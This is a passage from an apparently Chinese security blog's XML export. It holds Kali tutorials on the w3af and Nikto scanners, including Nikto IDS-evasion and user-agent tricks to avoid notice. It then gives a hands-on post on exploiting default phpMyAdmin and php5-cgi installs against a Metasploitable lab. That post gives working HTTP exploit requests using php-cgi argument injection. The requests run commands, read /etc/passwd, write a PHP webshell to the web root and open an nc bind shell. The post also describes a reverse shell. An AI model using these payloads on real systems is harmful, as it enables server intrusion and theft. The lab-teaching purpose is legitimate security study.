#设置对URL中的文件名进行模糊测试(Fuzz)w3af/config:misc-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; target #进入target模块,设置目标信息w3af/config:target&gt;&gt;&gt; help #查看在此模块下可以使用的命令|-----------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. || save | Save the configured settings. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------w3af/config:target&gt;&gt;&gt; view #列出可用的操作|----------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------|| target_framework | unknown | | Target programming framework || | | | (unknown/php/asp/asp.net/java/jsp/cfm/ruby/perl) || target | | | A comma separated list of URLs || target_os | unknown | | Target operating system (unknown/unix/windows) ||-----------------------------------------------------------------------------#设置目标URLw3af/config:target&gt;&gt;&gt; set target http://192.168.128.129w3af/config:target&gt;&gt;&gt; set target_os unix #设置目标系统为unixw3af/config:target&gt;&gt;&gt; back #返回上一级目录w3af&gt;&gt;&gt;start #开始扫描 也可以使用w3af中集成的脚本去进行扫描1234567891011121314151617181920212223242526272829root@kali:~/w3af-master# cd scripts/root@kali:~/w3af-master/scripts# lsallowed_methods.w3af login_brute_form_GET.w3afall.w3af login_brute_password_only.w3afauth_detailed.w3af mangle_request.w3afbing_spider.w3af mangle_response.w3afblind_sqli_detection.w3af os_commanding-lnx-vdaemon.w3afcookie_fuzzing.w3af os_commanding-lnx-w3afAgent.w3afcross_domain.w3af os_commanding_shell.w3afcsrf.w3af os_commanding.w3afdav_shell.w3af php_sca-payload.w3afdetect_transparent_proxy.w3af profile-fast_scan.w3afdigit_sum.w3af remote_file_include_local_ws.w3afdvwa.w3af remote_file_include_proxy.w3afeval_shell.w3af remote_file_include_shell.w3afeval.w3af remote_file_include_shell-xss.w3afexploit_all.w3af remote_file_include_w3af_site.w3afexploit_fast.w3af spider_man.w3affilename_xss.w3af sqli.w3affile_upload_shell.w3af sqlmap_exploit_int.w3affrontpage_version.w3af targets_from_file.w3afheader_fuzzing.w3af web_spider-ignore_regex.w3afhtml_output.w3af web_spider-only_forward.w3aflist_all_plugins.w3af web_spider.w3aflocal_file_include-payload.w3af xss_simple.w3aflocal_file_include.w3af xss_stored.w3af#参数-s表示指定具体的脚本去进行扫描,但需要首先去进入该脚本进行配置目标信息,然后调用w3af的console接口去扫描是否存在sql注入root@kali:~/w3af-master# ./w3af_console -s scripts/sqli.w3af]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB扫描工具之Nikto实践]]></title>
    <url>%2F2018%2F10%2F23%2FWEB%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B9%8BNikto%E5%AE%9E%E8%B7%B5-1%2F</url>
    <content type="text"><![CDATA[实验环境:kali:192.168.136.128/24 Metasploitable:192.168.136.129/24 Nikto简介Web扫描工具大部分都支持两种扫描模式:代理截断模式和主动扫描模式Nikto:是一个Web服务器扫描程序，主要是去检查软件版本信息,搜索存在的安全隐患的文件,服务器配置漏洞,Web Application层面的安全隐患等,也能避免404误判（原因：很多服务器不遵循RFC标准，对于不存在的对象返回200响应码）；依据响应文件内容判断，不同扩展名的文件404响应内容不同；去时间信息后的内容取MD5值；不建议用-no404参数（-no404参数指去不校验404误判,它还可以捕获并打印收到的任何cookie. Wiki百科对其功能的介绍 Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.Nikto是一个开源（GPL）Web服务器扫描程序，可针对多个项目对Web服务器执行全面测试，包括超过6700个潜在危险文件/ CGI，检查超过1250台服务器的过期版本，以及超过270台服务器上的版本特定问题。它还会检查服务器配置项，例如是否存在多个索引文件，HTTP服务器选项，并将尝试识别已安装的Web服务器和软件。扫描项目和插件经常更新，可以自动更新。 开始操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576root@kali:~# nikto -update #从CIRT.net网站更新nikto的数据库和插件root@kali:~# nikto -list-plugins #列出nikto内列出所有可用的插件#扫描目标主机的Web层面的漏洞,格式为:nikto -host 目标服务器URL(可以是多个URL)root@kali:~# nikto -host http://192.168.136.129 #也可以使用nikto -host 目标IP地址 -port 扫描端口,和上一条命令效果一致root@kali:~# nikto -host 192.168.136.129 -port 80,443 #使用ssl模式去扫描目标系统的信息root@kali:~# nikto -host www.baidu.com -port 443 -ssl #扫描多个目标,将目标地址存放在某个文本文档中,#目标地址格式为:http://主机名:端口或者IP地址:端口或者直接是IP地址root@kali:~# nikto -host host.txt #使用nmap扫描目标网段的80端口,将开放80端口的主机IP筛选出后传送给nikto进行扫描web服务漏洞,#参数-oG表示输出便于通过bash或者perl处理的格式,非xmlroot@kali:~# nmap -p80 192.168.136.129/24 -oG - | nikto -host - #nikto支持代理功能root@kali:~# nikto -host 192.168.1.1 -useproxy http://localhost:8087Nikto互动功能:Nikto包含几个可在活动扫描期间更改的选项，前提是它在提供POSIX支持的系统上运行，其中包括unix和其他一些操作系统。在没有POSIX支持的系统上，将以静默方式禁用这些功能。在主动扫描期间，按下面任何一个键将打开或关闭列出的功能或执行列出的操作。请注意，这些区分大小写。 SPACE - 报告当前扫描状态 v - 打开/关闭详细模式 d - 打开/关闭调试模式,极其详细信息 e - 打开/关闭错误报告 p - 打开/关闭进度报告 r - 打开/关闭重定向显示 c - 打开/关闭cookie显示 o - 打开/关闭OK显示 a - 打开/关闭验证显示 q - 退出 N - 下一个主持人 P - 暂停,大写Pcookie简介[cookie wiki](https://zh.wikipedia.org/wiki/Cookie)因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。修改nikto的配置文件,写入cookie信息,即可扫描那些需要身份认证才可以访问的页面root@kali:~# vim /etc/nikto.conf #编辑其配置文件修改USERAGENT,防止扫描的时候被系统管理员发现(我目前设置为win10的浏览器)USERAGENT=Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko (Evasions:@EVASIONS) (Test:@TESTID)设置用户代理的方法:使用火狐浏览器登陆[User-Agent Switcher](https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher-revived/?src=search),添加到Firefox,在右上角打开图标! 123456789101112131415161718192021在STATIC-COOKIE这个命令下取消注释,输入cookie信息,格式为&quot;cookie name1&quot;=&quot;value&quot;;&quot;cookie name2&quot;=&quot;value&quot;(可以设置多个cookie) STATIC-COOKIE=&quot;PHPSESSION&quot;=&quot;9eb59920d99db2871254303ec47b3460&quot;;&quot;security&quot;=&quot;high&quot;(这是我的cookie,需要自行抓取cookie信息) 然后保存退出,在终端开始用扫描(cookie扫描),将会获得更有效的扫描结果# nikto加参数-evasion表示使用LibWhisker中对IDS的躲避技术,防止被发现,root@kali:~# nikto -host http://192.168.136.129 可使用以下几种类型: • 1 随机URL编码(非UTF-8方式) • 2 自选择路径(/./) • 3 过早结束的URL • 4 优先考虑长随机字符串• 5 参数欺骗 • 6 使用TAB作为命令的分隔符 • 7 使用变化的URL • 8 使用Windows路径分隔符&quot;\&quot; #使用第一种,第六种,第七种方法,自行搭配root@kali:~# nikto -host http://192.168.136.129 -evasion 167]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘之默认安装漏洞]]></title>
    <url>%2F2018%2F10%2F23%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E4%B9%8B%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E-1%2F</url>
    <content type="text"><![CDATA[phpMyAdmin默认安装漏洞大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧. phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。 以下版本受到影响：phpMyAdmin 4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。 如果目标系统采用php语言搭建的环境,那么可以尝试使用一些扫描软件或者手动爬网去试图发现是否存在phpmyadmin目录. 测试环境:kali:192.168.128.128/24Metasploitable:192.168.128.129/24 1,存在phpmyadmin界面:如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件) 我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行 1234567891011121314151617POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码Host: 192.168.128.128 Content-Length: 35&lt;?php passthru(&apos;id&apos;); #passthru() 函数用于调用系统命令，并把命令的运行结果原样地直接输出到标准输出设备上。 #也可以将id命令换成其他Linux命令去获取web系统的数据,目前使用的是普通用户www-date,权限有限die(); #die() 函数输出一条消息，并退出当前脚本,此处使用为了避免获取多余无用的信息?&gt; 可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果 命令如下: 123456789101112POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1Host: 192.168.128.128 Content-Length: 102&lt;?php passthru(&apos;echo &quot;&lt;?php \$cmd = \$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt;/var/www/2.php&apos;);#该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令#反斜杠作用:避免服务器将上传内容过滤,输入命令无效die();?&gt; 通过在浏览器访问该木马,便可获取目标系统的shell 使用kali中的php脚本获取反弹shell 反弹shell:指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，那么我们就可以在本地使用被攻击主机的命令并且不容易被发现 kali中的PHP的反弹shell为:/usr/share/webshells/php/php-reverse-shell.php然后编辑php/php-reverse-shell.php,修改ip地址为本机kali的地址,端口号选1024-65535之内任意(1-1023端口已经被系统服务占用) 使用nc命令在本地(kali主机)监听本地1234端口然后将php-reverse-shell.php的内容粘贴至发送的POST请求中,点击go Ubuntu/Debain默认安装PHP5-CGI漏洞其针对Apache/PHP远程代码执行漏洞攻击该漏洞存在于使用PHP的Apache服务器，在Debian和Ubuntu的服务器上默认安装php5-cgi模块的服务器都存在此漏洞。程序员可以使用CGI模块在PHP代码中调用操作系统的命令如果安装了PHP5-CGI,则会在/usr/lib/cgi-bin下面生成两个二进制文件:php和php5我们发送编码后的参数信息(编码是为了防止服务器过滤信息)去获取目标服务器的shell 1234567891011121314POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1Host: 123Content-Length: 45&lt;?phpecho system(&apos;cat /etc/passwd&apos;);?&gt; 其实将刚刚编码的数据进行解码,可以看到其实就是PHP的参数数据 也可以让服务器主动打开一个端口,然后在本地使用nc去连接代码: 12345678910111213POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1Host: 123Content-Length: 86&lt;?phpecho system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);?&gt;]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
</search>
